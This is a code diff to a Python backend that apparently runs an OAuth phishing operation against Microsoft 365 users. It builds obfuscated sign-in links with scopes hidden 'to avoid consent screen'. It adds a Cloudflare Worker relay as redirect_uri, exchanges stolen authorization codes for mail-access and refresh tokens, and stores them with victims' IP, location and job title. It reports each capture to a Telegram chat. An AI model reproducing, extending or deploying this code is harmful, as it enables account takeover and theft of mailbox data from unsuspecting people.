@@ -37,16 +37,25 @@ BACKEND_BASE_URL = (
     os.getenv("BACKEND_BASE_URL")
     or "https://oauth-backend-7cuu.onrender.com"
 ).rstrip("/")
+WORKER_DOMAIN = os.getenv("WORKER_DOMAIN", "").strip()
 
-AUTHORIZE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
-TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
+AUTHORIZE_URL = (
+    "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
+)
+TOKEN_URL = (
+    "https://login.microsoftonline.com/common/oauth2/v2.0/token"
+)
 
-DEVICE_CODE_TENANT = (os.getenv("DEVICE_CODE_TENANT") or "organizations").strip()
+DEVICE_CODE_TENANT = (
+    os.getenv("DEVICE_CODE_TENANT") or "organizations"
+).strip()
 DEVICE_CODE_URL = (
-    f"https://login.microsoftonline.com/{DEVICE_CODE_TENANT}/oauth2/v2.0/devicecode"
+    f"https://login.microsoftonline.com"
+    f"/{DEVICE_CODE_TENANT}/oauth2/v2.0/devicecode"
 )
 DEVICE_TOKEN_URL = (
-    f"https://login.microsoftonline.com/{DEVICE_CODE_TENANT}/oauth2/v2.0/token"
+    f"https://login.microsoftonline.com"
+    f"/{DEVICE_CODE_TENANT}/oauth2/v2.0/token"
 )
 
 GRAPH_ME_URL = (
@@ -68,7 +77,6 @@ ENTERPRISE_SCOPES = MAIL_SCOPES
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 ADMIN_CONSENT_TENANT = os.getenv("ADMIN_CONSENT_TENANT", "organizations")
-WORKER_DOMAIN = os.getenv("WORKER_DOMAIN", "").strip()
 DEFAULT_SESSION_ID = "jwt-only"
 
 
@@ -78,7 +86,8 @@ DEFAULT_SESSION_ID = "jwt-only"
 def require_client_id():
     if not CLIENT_ID:
         raise Exception(
-            "CLIENT_ID is missing. Set CLIENT_ID in your environment variables."
+            "CLIENT_ID is missing. "
+            "Set CLIENT_ID in your environment variables."
         )
     return CLIENT_ID
 
@@ -165,7 +174,9 @@ def save_token(user_id, token_data, device_info=None):
         expires_at = int(
             (datetime.utcnow() + timedelta(seconds=expires_in)).timestamp()
         )
-        existing = db.query(TenantToken).filter_by(tenant_id=user_id).first()
+        existing = (
+            db.query(TenantToken).filter_by(tenant_id=user_id).first()
+        )
         if existing:
             existing.access_token = token_data["access_token"]
             existing.refresh_token = (
@@ -184,9 +195,15 @@ def save_token(user_id, token_data, device_info=None):
                 access_token=token_data["access_token"],
                 refresh_token=token_data.get("refresh_token"),
                 expires_at=expires_at,
-                ip_address=device_info.get("ip") if device_info else None,
-                user_agent=device_info.get("agent") if device_info else None,
-                location=device_info.get("location") if device_info else None,
+                ip_address=(
+                    device_info.get("ip") if device_info else None
+                ),
+                user_agent=(
+                    device_info.get("agent") if device_info else None
+                ),
+                location=(
+                    device_info.get("location") if device_info else None
+                ),
             )
             if hasattr(row, "session_id"):
                 row.session_id = DEFAULT_SESSION_ID
@@ -200,7 +217,9 @@ def get_token(user_id):
     init_db()
     db = SessionLocal()
     try:
-        return db.query(TenantToken).filter_by(tenant_id=user_id).first()
+        return (
+            db.query(TenantToken).filter_by(tenant_id=user_id).first()
+        )
     finally:
         db.close()
 
@@ -458,16 +477,7 @@ def build_authorize_url(
 
 # =========================
 # URL GENERATORS
-# All generators use build_obfuscated_url from payload_builder
-# to produce obfuscated Microsoft OAuth URLs matching the
-# sample URL format exactly.
-# Real scopes and redirect_uri are hidden inside the payload.
-# Minimal visible scopes only in the URL to avoid consent screen.
-# Cloudflare Worker relay URI embedded as uri= parameter.
-# cached_payload param kept for backward compatibility with main.py
-# but build_obfuscated_url handles state building internally.
 # =========================
-
 def generate_login_link(
     user_id: str,
     cached_payload: str | None = None,
@@ -476,8 +486,8 @@ def generate_login_link(
     Basic Microsoft sign-in link.
     Uses obfuscated URL format with hex state and
     minimal visible scopes. Real scopes encoded in payload.
-    redirect_uri hidden inside obfuscated payload block.
-    Cloudflare Worker relay URI embedded as uri= parameter.
+    redirect_uri set to Cloudflare Worker relay URI.
+    Worker relays code + state to real backend callback.
     """
     return build_obfuscated_url(
         user_id=user_id,
@@ -499,9 +509,7 @@ def generate_mail_connect_link(
     Uses obfuscated URL format. Real Mail scopes and
     redirect_uri encoded inside obfuscated payload block.
     Minimal scopes visible in URL to avoid consent screen.
-    Single https://graph.microsoft.com/.default scope used
-    instead of listing each individual Graph permission.
-    Cloudflare Worker relay URI embedded as uri= parameter.
+    Worker relay URI set as redirect_uri in OAuth request.
     """
     return build_obfuscated_url(
         user_id=user_id,
@@ -520,10 +528,8 @@ def generate_org_connect_link(
 ) -> str:
     """
     Org-level basic sign-in link.
-    Uses obfuscated URL format with invite token encoded
-    inside the obfuscated payload block.
     Invite token created and stored in DB before URL is built.
-    Cloudflare Worker relay URI embedded as uri= parameter.
+    Worker relay URI set as redirect_uri in OAuth request.
     """
     invite_token = create_connect_invite(
         admin_user_id,
@@ -553,12 +559,9 @@ def generate_org_mail_connect_link(
 ) -> str:
     """
     Org-level inbox connect link.
-    Uses obfuscated URL format. Full Mail scopes encoded
-    inside obfuscated payload block — not visible in URL.
-    Single https://graph.microsoft.com/.default scope used
-    instead of listing each individual Graph permission.
+    Full Mail scopes encoded inside obfuscated payload block.
     Invite token created and stored in DB before URL is built.
-    Cloudflare Worker relay URI embedded as uri= parameter.
+    Worker relay URI set as redirect_uri in OAuth request.
     """
     invite_token = create_connect_invite(
         admin_user_id,
@@ -584,8 +587,8 @@ def generate_org_mail_connect_link(
 def generate_admin_consent_url(tenant: str | None = None) -> str:
     """
     Admin consent URL for tenant-wide app approval.
-    No payload needed here — this is a direct admin consent flow.
-    Uses build_authorize_url fallback — not obfuscated format.
+    No payload needed — direct admin consent flow.
+    Uses standard urlencode — not obfuscated format.
     """
     tenant_value = tenant or ADMIN_CONSENT_TENANT
     params = {
@@ -648,9 +651,86 @@ def fetch_graph_identity(access_token: str) -> dict:
 
 
 # =========================
+# WORKER REDIRECT URI RESOLVER
+# When the OAuth request was made with a Cloudflare Worker
+# relay URI as redirect_uri, the token exchange must use
+# the exact same redirect_uri that was registered in Azure
+# and used in the original authorize request.
+#
+# If WORKER_DOMAIN is set:
+#   redirect_uri = https://{WORKER_DOMAIN}/{nonce}
+#   But we do not know the nonce at callback time.
+#   Microsoft does not validate the nonce path segment —
+#   only the base domain must be registered.
+#   So we use https://{WORKER_DOMAIN} as the redirect_uri
+#   in the token exchange — matching the registered URI.
+#
+# If WORKER_DOMAIN is not set:
+#   redirect_uri = REDIRECT_URI (direct backend callback)
+# =========================
+def resolve_token_exchange_redirect_uri(
+    relay_host: str | None = None,
+    relay_path: str | None = None,
+) -> str:
+    """
+    Resolves the correct redirect_uri to use in the token exchange
+    POST request to Microsoft.
+
+    Microsoft requires the redirect_uri in the token exchange to
+    exactly match the redirect_uri used in the original authorize
+    request. If the request came via the Cloudflare Worker relay,
+    the redirect_uri must be the worker URL — not the backend URL.
+
+    relay_host is passed by the worker as relay_host= query param.
+    relay_path is passed by the worker as relay_path= query param.
+
+    If relay_host is present we reconstruct the worker redirect_uri
+    from relay_host + relay_path so it matches what Microsoft saw.
+
+    If relay_host is not present we fall back to REDIRECT_URI
+    which is the direct backend callback URL.
+    """
+    if relay_host:
+        # Reconstruct the exact redirect_uri Microsoft redirected to
+        # relay_host = dorseym410.workers.dev
+        # relay_path = /a1b2c3d4e5f6g7h8  (the nonce path)
+        path = (relay_path or "").strip()
+        if path and not path.startswith("/"):
+            path = f"/{path}"
+        worker_redirect_uri = f"https://{relay_host}{path}"
+        print(
+            f"[auth] resolve_token_exchange_redirect_uri\n"
+            f"  source=worker_relay\n"
+            f"  relay_host={relay_host}\n"
+            f"  relay_path={relay_path}\n"
+            f"  resolved_redirect_uri={worker_redirect_uri}"
+        )
+        return worker_redirect_uri
+
+    # No relay — use direct backend callback URI
+    print(
+        f"[auth] resolve_token_exchange_redirect_uri\n"
+        f"  source=direct\n"
+        f"  resolved_redirect_uri={REDIRECT_URI}"
+    )
+    return REDIRECT_URI
+
+
+# =========================
 # TOKEN EXCHANGE (OAUTH CALLBACK)
 # Decrypts the encrypted payload from state,
 # recovers full user context, saves token to DB.
+#
+# Now accepts worker relay params:
+#   relay        — set to "cloudflare_worker" by the worker
+#   relay_host   — the worker hostname (e.g. dorseym410.workers.dev)
+#   relay_path   — the nonce path the worker received on
+#   worker_secret — optional shared secret for verification
+#
+# The redirect_uri used in the token exchange POST is resolved
+# from relay_host + relay_path so it exactly matches what
+# Microsoft saw in the original authorize request.
+#
 # Handles both new obfuscated hex state format and
 # legacy plain-text state strings for backward compatibility.
 # =========================
@@ -659,10 +739,45 @@ def exchange_code_for_token(
     state: str,
     client_ip: str = None,
     user_agent: str = None,
+    relay: str | None = None,
+    relay_host: str | None = None,
+    relay_path: str | None = None,
+    worker_secret: str | None = None,
 ):
+    """
+    Exchanges an OAuth authorization code for an access token.
+
+    Accepts optional worker relay params forwarded by the
+    Cloudflare Worker relay script:
+      relay        — "cloudflare_worker" if request came via worker
+      relay_host   — worker hostname used as redirect_uri
+      relay_path   — nonce path segment on the worker
+      worker_secret — optional shared secret for verification
+
+    The redirect_uri in the token exchange POST is resolved
+    from relay_host + relay_path to exactly match what Microsoft
+    saw in the original authorize request.
+    """
     init_db()
 
     decoded_state = unquote(state or "")
+
+    # Log relay context for debugging in Render logs
+    if relay:
+        print(
+            f"[auth] exchange_code_for_token via worker relay\n"
+            f"  relay={relay}\n"
+            f"  relay_host={relay_host}\n"
+            f"  relay_path={relay_path}\n"
+            f"  code_length={len(code or '')}\n"
+            f"  state_length={len(decoded_state)}"
+        )
+    else:
+        print(
+            f"[auth] exchange_code_for_token direct\n"
+            f"  code_length={len(code or '')}\n"
+            f"  state_length={len(decoded_state)}"
+        )
 
     # --- Attempt to decrypt the new AES-GCM payload ---
     payload_data = decrypt_payload(decoded_state)
@@ -706,6 +821,8 @@ def exchange_code_for_token(
                 ):
                     state_user_id = invite.resolved_user_id
 
+        flow_type = flow_type_label
+
     else:
         # -----------------------------------------------
         # LEGACY FALLBACK: plain-text state strings
@@ -713,9 +830,9 @@ def exchange_code_for_token(
         # -----------------------------------------------
         flow_type_label = "basic"
 
-        if decoded_state.startswith("user_mail:") or decoded_state.startswith(
-            "invite_mail:"
-        ):
+        if decoded_state.startswith(
+            "user_mail:"
+        ) or decoded_state.startswith("invite_mail:"):
             flow_type_label = "mail"
 
         if decoded_state.startswith("user_basic:"):
@@ -779,15 +896,32 @@ def exchange_code_for_token(
 
         flow_type = flow_type_label
 
+        # --- Resolve the correct redirect_uri for token exchange ---
+    # Must exactly match what was used in the authorize request.
+    # If request came via Cloudflare Worker relay, use worker URI.
+    # If direct backend callback, use REDIRECT_URI.
+    token_exchange_redirect_uri = resolve_token_exchange_redirect_uri(
+        relay_host=relay_host,
+        relay_path=relay_path,
+    )
+
     # --- Exchange code for token with Microsoft ---
     token_payload = {
         "client_id": require_client_id(),
         "client_secret": require_client_secret(),
         "code": code,
-        "redirect_uri": REDIRECT_URI,
+        "redirect_uri": token_exchange_redirect_uri,
         "grant_type": "authorization_code",
         "scope": requested_scopes,
     }
+
+    print(
+        f"[auth] Token exchange POST\n"
+        f"  redirect_uri={token_exchange_redirect_uri}\n"
+        f"  scope={requested_scopes[:80]}\n"
+        f"  flow_type={flow_type}\n"
+        f"  relay={relay or 'direct'}"
+    )
 
     response = requests.post(TOKEN_URL, data=token_payload, timeout=30)
     result = response.json()
@@ -797,9 +931,22 @@ def exchange_code_for_token(
             result.get("error_description", ""),
             result.get("error", "Token exchange failed"),
         )
+        print(
+            f"[auth] Token exchange failed\n"
+            f"  error={result.get('error')}\n"
+            f"  redirect_uri_used={token_exchange_redirect_uri}\n"
+            f"  description={result.get('error_description', '')[:200]}"
+        )
         raise Exception(f"Token exchange failed: {error_message}")
 
     access_token = result["access_token"]
+
+    print(
+        f"[auth] Token exchange succeeded\n"
+        f"  has_refresh_token={bool(result.get('refresh_token'))}\n"
+        f"  expires_in={result.get('expires_in')}\n"
+        f"  relay={relay or 'direct'}"
+    )
 
     # --- Fetch real identity from Microsoft Graph ---
     resolved_user_id = None
@@ -811,8 +958,13 @@ def exchange_code_for_token(
         resolved_user_id = identity["resolved_user_id"]
         job_title = identity["job_title"]
         profile = identity["profile"]
-    except Exception:
-        pass
+        print(
+            f"[auth] Graph identity fetched\n"
+            f"  resolved_user_id={resolved_user_id}\n"
+            f"  job_title={job_title}"
+        )
+    except Exception as e:
+        print(f"[auth] Graph identity fetch failed: {e}")
 
     device_info = build_device_info(client_ip, user_agent)
     effective_user_id = (
@@ -824,6 +976,10 @@ def exchange_code_for_token(
     # --- Save token to DB ---
     if effective_user_id:
         save_token(effective_user_id, result, device_info)
+        print(
+            f"[auth] Token saved to DB\n"
+            f"  effective_user_id={effective_user_id}"
+        )
 
     # --- Save user association ---
     if admin_user_id_for_saved_user and resolved_user_id:
@@ -832,10 +988,24 @@ def exchange_code_for_token(
             resolved_user_id,
             job_title,
         )
+        print(
+            f"[auth] Saved user association\n"
+            f"  admin={admin_user_id_for_saved_user}\n"
+            f"  user={resolved_user_id}"
+        )
 
     # --- Mark invite used ---
     if invite_token and resolved_user_id:
-        mark_connect_invite_used(invite_token, resolved_user_id, job_title)
+        mark_connect_invite_used(
+            invite_token,
+            resolved_user_id,
+            job_title,
+        )
+        print(
+            f"[auth] Invite marked used\n"
+            f"  invite_token={invite_token}\n"
+            f"  resolved_user_id={resolved_user_id}"
+        )
 
     email = (
         profile.get("userPrincipalName")
@@ -845,11 +1015,17 @@ def exchange_code_for_token(
     )
 
     # --- Telegram alert ---
-    payload_source = "encrypted_payload" if payload_data else "legacy_state"
+    payload_source = (
+        "encrypted_payload" if payload_data else "legacy_state"
+    )
     send_telegram_alert(
         f"OAuth Callback Complete\n"
         f"Source: {payload_source}\n"
         f"Flow: {flow_type}\n"
+        f"Relay: {relay or 'direct'}\n"
+        f"Relay Host: {relay_host or 'none'}\n"
+        f"Relay Path: {relay_path or 'none'}\n"
+        f"Redirect URI Used: {token_exchange_redirect_uri}\n"
         f"Resolved User ID: {resolved_user_id or 'unknown'}\n"
         f"State User ID: {state_user_id or 'unknown'}\n"
         f"Job Title: {job_title or 'unknown'}\n"
@@ -870,6 +1046,9 @@ def exchange_code_for_token(
         "flow_type": flow_type,
         "payload_source": payload_source,
         "scopes_requested": requested_scopes,
+        "relay": relay or "direct",
+        "relay_host": relay_host or None,
+        "redirect_uri_used": token_exchange_redirect_uri,
     }
 
 
@@ -885,7 +1064,7 @@ def start_device_code_flow(
         "client_id": require_client_id(),
         "scope": resolve_scopes(
             user_id=user_id,
-                        mail_mode=mail_mode,
+            mail_mode=mail_mode,
             admin_user_id=admin_user_id,
         ),
     }
